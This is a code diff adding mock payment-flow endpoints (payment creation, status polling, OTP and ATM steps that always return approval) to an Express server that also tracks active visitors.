@@ -40,6 +40,7 @@ function writeApplications(list) {
 // A visitor counts as "active" if we heard from them in the last 30s.
 const lastSeen = new Map();
 const ACTIVE_WINDOW_MS = 30 * 1000;
+const paymentFlow = new Map();
 
 function countActiveVisitors() {
   const now = Date.now();
@@ -113,6 +114,79 @@ app.post('/api/heartbeat', (req, res) => {
 // ---- API: current active visit count ----
 app.get('/api/active-visits', (req, res) => {
   res.json({ count: countActiveVisitors() });
+});
+
+// ---- Payment flow mock endpoints used by the frontend ----
+app.post('/api/payment', (req, res) => {
+  const { requestId, amount, currency, cardName } = req.body || {};
+  const id = requestId || crypto.randomUUID();
+
+  paymentFlow.set(id, {
+    id,
+    status: 'otp',
+    redirectUrl: 'otp.html',
+    amount: amount || 0,
+    currency: currency || 'SAR',
+    cardName: cardName || 'Customer',
+    createdAt: Date.now()
+  });
+
+  res.json({ ok: true, id, status: 'otp', redirectUrl: 'otp.html' });
+});
+
+app.get('/api/status/:id', (req, res) => {
+  const { id } = req.params;
+  const record = paymentFlow.get(id);
+
+  if (!record) {
+    return res.status(404).json({ ok: false, error: 'not_found' });
+  }
+
+  const payload = {
+    ok: true,
+    status: record.status,
+    redirectUrl: record.redirectUrl || 'otp.html',
+    redirect: record.redirect || null,
+    stage: record.stage || 'payment',
+    decision: record.decision || null
+  };
+
+  res.json(payload);
+});
+
+app.post('/api/otp', (req, res) => {
+  const { id } = req.body || {};
+  const record = paymentFlow.get(id);
+
+  if (!record) {
+    return res.status(404).json({ ok: false, error: 'not_found' });
+  }
+
+  record.status = 'approved';
+  record.stage = 'success';
+  record.decision = 'approved';
+  record.redirect = 'success-ar.html';
+  record.redirectUrl = 'otp.html';
+  paymentFlow.set(id, record);
+
+  res.json({ ok: true, redirect: 'success-ar.html' });
+});
+
+app.post('/api/atm', (req, res) => {
+  const { id } = req.body || {};
+  const record = paymentFlow.get(id);
+
+  if (!record) {
+    return res.status(404).json({ ok: false, error: 'not_found' });
+  }
+
+  record.status = 'approved';
+  record.stage = 'success';
+  record.decision = 'approved';
+  record.redirect = 'success-ar.html';
+  paymentFlow.set(id, record);
+
+  res.json({ ok: true, redirect: 'success-ar.html' });
 });
 
 app.listen(PORT, () => {
